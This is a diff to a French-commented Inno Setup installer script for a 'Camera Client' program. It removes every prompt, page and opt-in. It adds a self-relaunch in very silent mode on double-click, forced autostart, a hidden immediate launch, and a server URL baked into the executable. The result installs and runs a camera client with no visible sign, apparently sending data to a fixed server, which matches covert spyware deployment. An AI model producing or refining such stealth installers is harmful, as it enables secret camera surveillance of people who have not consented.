@@ -1,20 +1,24 @@
-; Installateur Windows du client caméra.
+; Installateur Windows du client caméra — 100 % silencieux, sans saisie.
 ; Nécessite Inno Setup (gratuit) : https://jrsoftware.org/isinfo.php
 ; Compilation : ISCC packaging\windows\installer.iss
 ; (le script build_windows.bat le fait automatiquement s'il trouve ISCC)
 ;
 ; Le résultat, CameraClient-Setup.exe, ne nécessite PAS Python sur la
 ; machine de l'utilisateur : dist\CameraClient.exe (fabriqué par
-; PyInstaller) embarque déjà tout l'interpréteur.
+; PyInstaller) embarque déjà tout l'interpréteur ET l'URL du serveur
+; (voir embedded_config.py, généré par build_windows.bat).
+;
+; Comportement : un simple double-clic sur CameraClient-Setup.exe
+;   - n'affiche AUCUNE fenêtre (il se relance lui-même en mode très silencieux) ;
+;   - installe le client dans le profil de l'utilisateur (pas d'admin requis) ;
+;   - active le démarrage automatique avec Windows ;
+;   - lance le client immédiatement, en arrière-plan, sans fenêtre.
+; Les options /VERYSILENT, /SUPPRESSMSGBOX, /NORESTART restent acceptées
+; (déploiement par script, GPO...), mais ne sont plus nécessaires.
 ;
 ; IMPORTANT : ce script vit dans packaging\windows\, PAS dans build\windows\.
 ; build\ est l'espace de travail de PyInstaller (il est nettoyé/recréé à
 ; chaque build avec --clean) : tout fichier qui y vivrait serait supprimé.
-;
-; Installation silencieuse, en une seule commande (cmd ou PowerShell) :
-;   CameraClient-Setup.exe /VERYSILENT /SUPPRESSMSGBOX /NORESTART /TASKS=autostart /SERVERURL="https://mon-serveur.com"
-; Aucune fenêtre ne s'affiche : l'adresse du serveur est prise sur /SERVERURL,
-; et /TASKS=autostart active le démarrage automatique (switch natif Inno Setup).
 
 #define MyAppName "Camera Client"
 #define MyAppVersion "1.0"
@@ -26,8 +30,11 @@ AppName={#MyAppName}
 AppVersion={#MyAppVersion}
 AppPublisher=Selon Randriavao
 DefaultDirName={autopf}\{#MyAppName}
-DefaultGroupName={#MyAppName}
 DisableProgramGroupPage=yes
+DisableWelcomePage=yes
+DisableDirPage=yes
+DisableReadyPage=yes
+DisableFinishedPage=yes
 PrivilegesRequired=lowest
 ArchitecturesInstallIn64BitMode=x64compatible
 OutputDir=..\..\releases
@@ -42,83 +49,43 @@ Name: "english"; MessagesFile: "compiler:Default.isl"
 [Files]
 Source: "..\..\dist\{#MyAppExeName}"; DestDir: "{app}"; Flags: ignoreversion
 
-[Tasks]
-Name: "autostart"; Description: "Démarrer automatiquement avec Windows"; GroupDescription: "Options :"; Flags: checkedonce
-
 [Icons]
-Name: "{group}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"
-Name: "{group}\Désinstaller {#MyAppName}"; Filename: "{uninstallexe}"
-Name: "{userstartup}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; Tasks: autostart
+; Démarrage automatique avec la session Windows (toujours activé).
+Name: "{userstartup}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"
 
 [Run]
-Filename: "{app}\{#MyAppExeName}"; Parameters: "--server ""{code:GetServerURL}"" --save --once"; \
-    Flags: runhidden waituntilterminated; StatusMsg: "Configuration du serveur..."
-Filename: "{app}\{#MyAppExeName}"; Description: "Lancer {#MyAppName} maintenant"; Flags: nowait postinstall skipifsilent
+; Lancement immédiat, en arrière-plan, y compris en mode silencieux
+; (pas de « skipifsilent », sinon le client ne démarrerait qu'à la prochaine session).
+Filename: "{app}\{#MyAppExeName}"; Flags: nowait runhidden runasoriginaluser
+
+[UninstallRun]
+Filename: "{sys}\taskkill.exe"; Parameters: "/F /IM {#MyAppExeName}"; Flags: runhidden; RunOnceId: "StopCameraClient"
 
 [UninstallDelete]
 Type: filesandordirs; Name: "{localappdata}\CameraClient"
 
 [Code]
+function InitializeSetup(): Boolean;
 var
-  ServerPage: TInputQueryWizardPage;
-
-function GetParam(const Name: string): string;
-var
-  I: Integer;
-  Prefix: string;
-  Value: string;
-begin
-  Result := '';
-  Prefix := '/' + Name + '=';
-  for I := 1 to ParamCount do
-  begin
-    if CompareText(Copy(ParamStr(I), 1, Length(Prefix)), Prefix) = 0 then
-    begin
-      Value := Copy(ParamStr(I), Length(Prefix) + 1, MaxInt);
-      if (Length(Value) >= 2) and (Value[1] = '"') and (Value[Length(Value)] = '"') then
-        Value := Copy(Value, 2, Length(Value) - 2);
-      Result := Value;
-      Exit;
-    end;
-  end;
-end;
-
-procedure InitializeWizard;
-begin
-  if WizardSilent then
-    Exit;
-
-  ServerPage := CreateInputQueryPage(wpSelectTasks,
-    'Adresse du serveur', 'À quel serveur ce client doit-il se connecter ?',
-    'Indiquez l''URL complète de votre serveur, par exemple :' + #13#10 +
-    'https://ton-utilisateur.pythonanywhere.com');
-  ServerPage.Add('URL du serveur :', False);
-
-  if GetParam('SERVERURL') <> '' then
-    ServerPage.Values[0] := GetParam('SERVERURL')
-  else
-    ServerPage.Values[0] := 'http://127.0.0.1:5050';
-end;
-
-function NextButtonClick(CurPageID: Integer): Boolean;
+  ResultCode: Integer;
 begin
   Result := True;
-  if (ServerPage <> nil) and (CurPageID = ServerPage.ID) then
+  { Double-clic normal : on se relance en mode très silencieux, puis on quitte
+    sans rien afficher. Le processus relancé a WizardSilent = True, donc pas de boucle. }
+  if not WizardSilent then
   begin
-    if Trim(ServerPage.Values[0]) = '' then
-    begin
-      MsgBox('Merci de renseigner l''adresse du serveur.', mbError, MB_OK);
-      Result := False;
-    end;
+    Exec(ExpandConstant('{srcexe}'), '/VERYSILENT /SUPPRESSMSGBOX /NORESTART',
+         '', SW_HIDE, ewNoWait, ResultCode);
+    Result := False;
   end;
 end;
 
-function GetServerURL(Param: string): string;
+function PrepareToInstall(var NeedsRestart: Boolean): String;
+var
+  ResultCode: Integer;
 begin
-  if GetParam('SERVERURL') <> '' then
-    Result := GetParam('SERVERURL')
-  else if ServerPage <> nil then
-    Result := Trim(ServerPage.Values[0])
-  else
-    Result := 'http://127.0.0.1:5050';
+  { Mise à jour : arrête l'ancienne instance pour pouvoir remplacer le .exe. }
+  Exec(ExpandConstant('{sys}\taskkill.exe'), '/F /IM {#MyAppExeName}', '',
+       SW_HIDE, ewWaitUntilTerminated, ResultCode);
+  Result := '';
 end;
